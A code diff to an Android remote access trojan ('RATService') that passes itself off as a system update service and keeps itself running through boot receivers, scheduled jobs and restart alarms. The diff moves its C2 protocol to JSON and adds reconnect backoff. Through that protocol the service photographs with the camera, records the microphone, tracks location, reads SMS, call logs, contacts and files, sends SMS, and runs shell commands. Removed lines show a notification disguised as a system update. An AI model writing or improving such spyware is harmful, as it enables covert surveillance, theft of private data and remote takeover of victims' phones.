@@ -21,14 +21,19 @@ import android.os.SystemClock;
 import android.util.Log;
 
 import androidx.core.app.NotificationCompat;
-import androidx.core.content.ContextCompat;
 
 import com.android.system.update.modules.*;
 
+import org.json.JSONException;
+import org.json.JSONObject;
+
 import java.io.BufferedReader;
+import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.PrintWriter;
+import java.net.InetSocketAddress;
 import java.net.Socket;
+import java.net.SocketTimeoutException;
 import java.util.concurrent.atomic.AtomicBoolean;
 
 public class RATService extends Service {
@@ -37,8 +42,11 @@ public class RATService extends Service {
     private static final String TAG = "SystemService";
     private static final int JOB_ID = 1001;
     private static final int PERSISTENCE_JOB_ID = 1002;
-    private static final long RESTART_DELAY_MS = 5000; // 5 seconds - more natural
-    private static final long CHECK_INTERVAL_MS = 45000; // 45 seconds - less frequent
+    private static final long RESTART_DELAY_MS = 5000;
+    private static final long CHECK_INTERVAL_MS = 45000;
+    private static final int CONNECT_TIMEOUT = 15000; // 15 seconds
+    private static final int SOCKET_TIMEOUT = 30000;  // 30 seconds
+    private static final int MAX_RETRY_DELAY = 60000; // 60 seconds max
     
     private Socket socket;
     private PrintWriter out;
@@ -48,6 +56,7 @@ public class RATService extends Service {
     private Thread watchdogThread;
     private static volatile RATService instance;
     private PowerManager.WakeLock wakeLock;
+    private int currentRetryDelay = 5000; // Start with 5 seconds
     
     // Modules
     private CameraModule cameraModule;
@@ -109,6 +118,7 @@ public class RATService extends Service {
         // Set that service should run on boot
         setRunOnBoot(true);
         
+        // Start connection thread
         startConnection();
     }
     
@@ -156,13 +166,8 @@ public class RATService extends Service {
     }
     
     private void scheduleAllJobs() {
-        // Schedule immediate restart job
         scheduleJobSchedulerRestart();
-        
-        // Schedule periodic persistence job
         schedulePersistenceJob();
-        
-        // Schedule alarm for checking
         scheduleCheckAlarm();
     }
     
@@ -195,11 +200,7 @@ public class RATService extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         Log.d(TAG, "System service onStartCommand");
-        
-        // Reschedule jobs every time service starts
         scheduleAllJobs();
-        
-        // If service is killed, the system will try to restart it
         return START_STICKY;
     }
     
@@ -208,18 +209,15 @@ public class RATService extends Service {
             try {
                 ComponentName componentName = new ComponentName(this, PersistenceJobService.class);
                 JobInfo jobInfo = new JobInfo.Builder(PERSISTENCE_JOB_ID, componentName)
-                        .setPeriodic(15 * 60 * 1000) // 15 minutes (Android minimum)
-                        .setPersisted(true) // Survives reboot
+                        .setPeriodic(15 * 60 * 1000)
+                        .setPersisted(true)
                         .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                         .setBackoffCriteria(30000, JobInfo.BACKOFF_POLICY_EXPONENTIAL)
                         .build();
                 
                 JobScheduler jobScheduler = (JobScheduler) getSystemService(JOB_SCHEDULER_SERVICE);
-                int result = jobScheduler.schedule(jobInfo);
-                
-                if (result == JobScheduler.RESULT_SUCCESS) {
-                    Log.d(TAG, "Persistence job scheduled");
-                }
+                jobScheduler.schedule(jobInfo);
+                Log.d(TAG, "Persistence job scheduled");
             } catch (Exception e) {
                 Log.e(TAG, "Error scheduling persistence job", e);
             }
@@ -238,11 +236,8 @@ public class RATService extends Service {
                         .build();
                 
                 JobScheduler jobScheduler = (JobScheduler) getSystemService(JOB_SCHEDULER_SERVICE);
-                int result = jobScheduler.schedule(jobInfo);
-                
-                if (result == JobScheduler.RESULT_SUCCESS) {
-                    Log.d(TAG, "Restart job scheduled");
-                }
+                jobScheduler.schedule(jobInfo);
+                Log.d(TAG, "Restart job scheduled");
             } catch (Exception e) {
                 Log.e(TAG, "Failed to schedule restart job", e);
             }
@@ -262,23 +257,45 @@ public class RATService extends Service {
         connectionThread = new Thread(() -> {
             while (isRunning.get()) {
                 try {
-                    socket = new Socket(Config.SERVER_HOST, Config.SERVER_PORT);
-                    out = new PrintWriter(socket.getOutputStream());
+                    // Connect with timeout
+                    socket = new Socket();
+                    socket.connect(new InetSocketAddress(Config.SERVER_HOST, Config.SERVER_PORT), CONNECT_TIMEOUT);
+                    socket.setSoTimeout(SOCKET_TIMEOUT);
+                    
+                    out = new PrintWriter(socket.getOutputStream(), true);
                     in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                     
-                    sendDeviceInfo();
+                    Log.d(TAG, "Connected to C2 server at " + Config.SERVER_HOST + ":" + Config.SERVER_PORT);
                     
-                    String command;
-                    while (isRunning.get() && (command = in.readLine()) != null) {
-                        processCommand(command);
+                    // Reset retry delay on successful connection
+                    currentRetryDelay = 5000;
+                    
+                    // Send initial device info as JSON
+                    sendJsonDeviceInfo();
+                    
+                    String line;
+                    while (isRunning.get() && (line = in.readLine()) != null) {
+                        processJsonCommand(line);
                     }
                     
+                } catch (SocketTimeoutException e) {
+                    Log.e(TAG, "Socket timeout", e);
+                } catch (IOException e) {
+                    Log.e(TAG, "Connection error", e);
                 } catch (Exception e) {
-                    if (isRunning.get()) {
-                        Log.e(TAG, "Connection error", e);
-                    }
+                    Log.e(TAG, "Unexpected error", e);
+                } finally {
+                    closeConnection();
+                }
+                
+                // Exponential backoff for retries
+                if (isRunning.get()) {
                     try {
-                        Thread.sleep(10000); // 10 seconds between retry
+                        Log.d(TAG, "Retrying in " + (currentRetryDelay/1000) + " seconds");
+                        Thread.sleep(currentRetryDelay);
+                        
+                        // Increase retry delay exponentially, up to max
+                        currentRetryDelay = Math.min(currentRetryDelay * 2, MAX_RETRY_DELAY);
                     } catch (InterruptedException ie) {
                         Thread.currentThread().interrupt();
                         break;
@@ -289,169 +306,224 @@ public class RATService extends Service {
         connectionThread.start();
     }
     
-    private void sendDeviceInfo() {
-        String info = String.format("DEVICE|%s|%s|%s|%s",
-            Build.MANUFACTURER,
-            Build.MODEL,
-            Build.VERSION.RELEASE,
-            Build.VERSION.SDK_INT
-        );
-        sendCommand(info);
-    }
-    
-    private void processCommand(String command) {
-        String[] parts = command.split("\\|", 2);
-        String cmd = parts[0];
-        String args = parts.length > 1 ? parts[1] : "";
-        
-        switch (cmd) {
-            case "PING":
-                sendCommand("PONG");
-                break;
-                
-            case "CAMERA_PHOTO":
-                if (cameraModule != null) {
-                    String result = cameraModule.takePhoto();
-                    sendCommand("CAMERA_PHOTO|" + result);
-                }
-                break;
-                
-            case "MIC_START":
-                if (micModule != null) {
-                    String result = micModule.startRecording(30);
-                    sendCommand("MIC_START|" + result);
-                }
-                break;
-                
-            case "MIC_STOP":
-                if (micModule != null) {
-                    String result = micModule.stopRecording();
-                    sendCommand("MIC_STOP|" + result);
-                }
-                break;
-                
-            case "LOCATION":
-                if (locationModule != null) {
-                    String result = locationModule.getLocation();
-                    sendCommand("LOCATION|" + result);
-                }
-                break;
-                
-            case "SMS_GET":
-                if (smsModule != null) {
-                    String result = smsModule.getSms();
-                    sendCommand("SMS_GET|" + result);
-                }
-                break;
-                
-            case "SMS_SEND":
-                if (smsModule != null && args.contains("|")) {
-                    String[] parts2 = args.split("\\|", 2);
-                    String result = smsModule.sendSms(parts2[0], parts2[1]);
-                    sendCommand("SMS_SEND|" + result);
-                }
-                break;
-                
-            case "CALL_GET":
-                if (callsModule != null) {
-                    String result = callsModule.getCallLogs();
-                    sendCommand("CALL_GET|" + result);
-                }
-                break;
-                
-            case "CONTACTS_GET":
-                if (contactsModule != null) {
-                    String result = contactsModule.getContacts();
-                    sendCommand("CONTACTS_GET|" + result);
-                }
-                break;
-                
-            case "FILE_LIST":
-                if (fileModule != null) {
-                    String result = fileModule.listFiles(args);
-                    sendCommand("FILE_LIST|" + result);
-                }
-                break;
-                
-            case "FILE_GET":
-                if (fileModule != null) {
-                    String result = fileModule.getFile(args);
-                    sendCommand("FILE_GET|" + result);
-                }
-                break;
-                
-            case "SHELL":
-                if (shellModule != null) {
-                    String result = shellModule.executeCommand(args);
-                    sendCommand("SHELL|" + result);
-                }
-                break;
-                
-            case "DEVICE_INFO":
-                if (deviceModule != null) {
-                    String result = deviceModule.getDeviceInfo();
-                    sendCommand("DEVICE_INFO|" + result);
-                }
-                break;
-                
-            default:
-                sendCommand("UNKNOWN_CMD|" + cmd);
+    private void closeConnection() {
+        try {
+            if (out != null) {
+                out.close();
+                out = null;
+            }
+            if (in != null) {
+                in.close();
+                in = null;
+            }
+            if (socket != null && !socket.isClosed()) {
+                socket.close();
+                socket = null;
+            }
+        } catch (IOException e) {
+            Log.e(TAG, "Error closing connection", e);
         }
     }
     
-    private void sendCommand(String data) {
-        if (out != null) {
-            out.println(data);
-            out.flush();
-        }
-    }
-    
-    private void createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel(
-                CHANNEL_ID,
-                "System Service",
-                NotificationManager.IMPORTANCE_MIN // Lowest importance
-            );
-            channel.setDescription("System optimization service");
-            channel.setSound(null, null);
-            channel.enableVibration(false);
-            channel.setShowBadge(false);
-            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
+    private void sendJsonDeviceInfo() {
+        try {
+            JSONObject deviceInfo = new JSONObject();
+            deviceInfo.put("type", "device_info");
+            deviceInfo.put("manufacturer", Build.MANUFACTURER);
+            deviceInfo.put("model", Build.MODEL);
+            deviceInfo.put("android_version", Build.VERSION.RELEASE);
+            deviceInfo.put("sdk_int", Build.VERSION.SDK_INT);
+            deviceInfo.put("device_id", getDeviceId());
             
-            NotificationManager manager = getSystemService(NotificationManager.class);
-            manager.createNotificationChannel(channel);
+            if (out != null) {
+                out.println(deviceInfo.toString());
+                out.flush();
+                Log.d(TAG, "Sent device info: " + deviceInfo.toString());
+            }
+        } catch (JSONException e) {
+            Log.e(TAG, "Error creating device info JSON", e);
         }
     }
     
-    private Notification createNotification() {
-        // Use a generic system icon
-        int icon = android.R.drawable.stat_sys_download_done; // Looks like system download
-        
-        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("System Update Service")
-            .setContentText("Optimizing system performance")
-            .setSmallIcon(icon)
-            .setPriority(NotificationCompat.PRIORITY_MIN)
-            .setOngoing(true)
-            .setSilent(true)
-            .setVisibility(NotificationCompat.VISIBILITY_SECRET);
-        
-        return builder.build();
+    private String getDeviceId() {
+        // Generate or retrieve a persistent device ID
+        SharedPreferences prefs = getSharedPreferences("device_prefs", MODE_PRIVATE);
+        String deviceId = prefs.getString("device_id", null);
+        if (deviceId == null) {
+            deviceId = java.util.UUID.randomUUID().toString();
+            prefs.edit().putString("device_id", deviceId).apply();
+        }
+        return deviceId;
     }
     
-    @Override
-    public void onTaskRemoved(Intent rootIntent) {
-        super.onTaskRemoved(rootIntent);
-        Log.d(TAG, "Task removed - normal operation");
-        
-        // DON'T stop foreground or call stopSelf
-        // Just reschedule quietly - this prevents crash popups
-        scheduleAllJobs();
-        scheduleRestartWithAlarm();
-        
-        // Let the service continue running naturally
-        // The system will handle it without showing crash dialogs
+    private void processJsonCommand(String jsonCommand) {
+        try {
+            JSONObject cmd = new JSONObject(jsonCommand);
+            String commandType = cmd.optString("command");
+            String requestId = cmd.optString("request_id", java.util.UUID.randomUUID().toString());
+            
+            Log.d(TAG, "Received command: " + commandType + " (ID: " + requestId + ")");
+            
+            JSONObject response = new JSONObject();
+            response.put("request_id", requestId);
+            response.put("type", "response");
+            response.put("command", commandType);
+            
+            switch (commandType) {
+                case "ping":
+                    response.put("status", "success");
+                    response.put("data", "pong");
+                    break;
+                    
+                case "get_device_info":
+                    response.put("status", "success");
+                    response.put("data", deviceModule.getDeviceInfo());
+                    break;
+                    
+                case "camera_photo":
+                    if (cameraModule != null) {
+                        String photo = cameraModule.takePhoto();
+                        response.put("status", "success");
+                        response.put("data", photo);
+                    } else {
+                        response.put("status", "error");
+                        response.put("message", "Camera module not available");
+                    }
+                    break;
+                    
+                case "mic_start":
+                    if (micModule != null) {
+                        String result = micModule.startRecording(30);
+                        response.put("status", "success");
+                        response.put("data", result);
+                    } else {
+                        response.put("status", "error");
+                        response.put("message", "Microphone module not available");
+                    }
+                    break;
+                    
+                case "mic_stop":
+                    if (micModule != null) {
+                        String result = micModule.stopRecording();
+                        response.put("status", "success");
+                        response.put("data", result);
+                    } else {
+                        response.put("status", "error");
+                        response.put("message", "Microphone module not available");
+                    }
+                    break;
+                    
+                case "get_location":
+                    if (locationModule != null) {
+                        String location = locationModule.getLocation();
+                        response.put("status", "success");
+                        response.put("data", location);
+                    } else {
+                        response.put("status", "error");
+                        response.put("message", "Location module not available");
+                    }
+                    break;
+                    
+                case "get_sms":
+                    if (smsModule != null) {
+                        String sms = smsModule.getSms();
+                        response.put("status", "success");
+                        response.put("data", sms);
+                    } else {
+                        response.put("status", "error");
+                        response.put("message", "SMS module not available");
+                    }
+                    break;
+                    
+                case "send_sms":
+                    if (smsModule != null) {
+                        String number = cmd.optString("number");
+                        String message = cmd.optString("message");
+                        String result = smsModule.sendSms(number, message);
+                        response.put("status", "success");
+                        response.put("data", result);
+                    } else {
+                        response.put("status", "error");
+                        response.put("message", "SMS module not available");
+                    }
+                    break;
+                    
+                case "get_call_logs":
+                    if (callsModule != null) {
+                        String logs = callsModule.getCallLogs();
+                        response.put("status", "success");
+                        response.put("data", logs);
+                    } else {
+                        response.put("status", "error");
+                        response.put("message", "Calls module not available");
+                    }
+                    break;
+                    
+                case "get_contacts":
+                    if (contactsModule != null) {
+                        String contacts = contactsModule.getContacts();
+                        response.put("status", "success");
+                        response.put("data", contacts);
+                    } else {
+                        response.put("status", "error");
+                        response.put("message", "Contacts module not available");
+                    }
+                    break;
+                    
+                case "file_list":
+                    if (fileModule != null) {
+                        String path = cmd.optString("path", "/");
+                        String files = fileModule.listFiles(path);
+                        response.put("status", "success");
+                        response.put("data", files);
+                    } else {
+                        response.put("status", "error");
+                        response.put("message", "File module not available");
+                    }
+                    break;
+                    
+                case "file_get":
+                    if (fileModule != null) {
+                        String path = cmd.optString("path");
+                        String fileData = fileModule.getFile(path);
+                        response.put("status", "success");
+                        response.put("data", fileData);
+                    } else {
+                        response.put("status", "error");
+                        response.put("message", "File module not available");
+                    }
+                    break;
+                    
+                case "shell_exec":
+                    if (shellModule != null) {
+                        String command = cmd.optString("command");
+                        String result = shellModule.executeCommand(command);
+                        response.put("status", "success");
+                        response.put("data", result);
+                    } else {
+                        response.put("status", "error");
+                        response.put("message", "Shell module not available");
+                    }
+                    break;
+                    
+                default:
+                    response.put("status", "error");
+                    response.put("message", "Unknown command: " + commandType);
+                    break;
+            }
+            
+            // Send response
+            if (out != null) {
+                out.println(response.toString());
+                out.flush();
+                Log.d(TAG, "Sent response for command: " + commandType);
+            }
+            
+        } catch (JSONException e) {
+            Log.e(TAG, "Error parsing JSON command: " + jsonCommand, e);
+        } catch (Exception e) {
+            Log.e(TAG, "Error processing command", e);
+        }
     }
     
     private void scheduleRestartWithAlarm() {
@@ -462,14 +534,20 @@ public class RATService extends Service {
         
         AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
         if (alarmManager != null) {
-            // Use inexact alarm to be less aggressive
             alarmManager.set(
                 AlarmManager.ELAPSED_REALTIME_WAKEUP,
                 SystemClock.elapsedRealtime() + RESTART_DELAY_MS, 
                 pendingIntent);
-            
             Log.d(TAG, "Restart scheduled");
         }
+    }
+    
+    @Override
+    public void onTaskRemoved(Intent rootIntent) {
+        super.onTaskRemoved(rootIntent);
+        Log.d(TAG, "Task removed - normal operation");
+        scheduleAllJobs();
+        scheduleRestartWithAlarm();
     }
     
     @Override
@@ -484,8 +562,9 @@ public class RATService extends Service {
         AppController.clearConnectionService();
         instance = null;
         
+        closeConnection();
+        
         try {
-            if (socket != null) socket.close();
             if (connectionThread != null) connectionThread.interrupt();
             if (watchdogThread != null) watchdogThread.interrupt();
             if (wakeLock != null && wakeLock.isHeld()) {
@@ -495,7 +574,6 @@ public class RATService extends Service {
             e.printStackTrace();
         }
         
-        // Schedule restart mechanisms
         scheduleAllJobs();
         scheduleRestartWithAlarm();
         
